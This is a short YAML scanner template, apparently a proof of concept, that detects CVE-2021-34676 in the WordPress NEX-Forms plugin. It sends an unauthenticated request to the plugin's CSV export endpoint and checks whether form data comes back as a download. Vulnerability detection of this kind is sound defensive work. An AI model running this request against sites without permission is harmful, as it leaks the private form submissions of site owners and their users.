name: poc-yaml-wordpress-nex-form-cve-2021-34676-info-leak
binding: c75b04cd-3d16-43a0-805a-3a1c1c8d4664
manual: true
detail:
    author: Â∞èz
    links:
        - https://github.com/rauschecker/CVEs/tree/main/CVE-2021-34676
    vulnerability:
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin.php?page=nex-forme-dashboard&export_csv=true
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("application/csv") && response.body_string.contains("Id,") && response.headers["Content-Disposition"].contains("attachment") && "Content-Transfer-Encoding" in response.headers
expression: r0()
